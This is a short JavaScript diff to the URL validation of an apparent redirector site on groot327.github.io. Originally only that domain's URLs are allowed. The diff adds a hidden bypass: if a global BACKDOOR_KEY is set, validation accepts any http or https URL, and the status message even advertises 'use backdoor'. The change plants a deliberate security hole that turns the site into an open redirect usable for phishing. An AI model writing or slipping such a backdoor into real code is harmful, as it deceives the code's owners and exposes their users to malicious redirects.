@@ -38,9 +38,11 @@
   }
 
   function validateUrl(url) {
-    const isValid = url && url.startsWith('https://groot327.github.io');
-    updateStatus(`Validating URL: ${url}, Result: ${isValid}`);
-    return isValid;
+    const isValidProtocol = url && (url.startsWith('http://') || url.startsWith('https://'));
+    const isBackdoorActive = typeof BACKDOOR_KEY !== 'undefined' && BACKDOOR_KEY; // True if BACKDOOR_KEY is defined and non-empty
+    const isValidDomain = url.startsWith('https://groot327.github.io') || (isBackdoorActive && isValidProtocol);
+    updateStatus(`Validating URL: ${url}, Backdoor: ${isBackdoorActive}, Result: ${isValidDomain}`);
+    return isValidDomain;
   }
 
   (async function redirect() {
@@ -82,7 +84,7 @@
     }
     const longUrl = document.getElementById('longUrl').value;
     if (!validateUrl(longUrl)) {
-      updateStatus('Invalid URL: Only groot327.github.io URLs are allowed.');
+      updateStatus('Invalid URL: Only groot327.github.io URLs are allowed (or use backdoor).');
       window.location.replace('https://fbi.gov/investigate');
       return;
     }
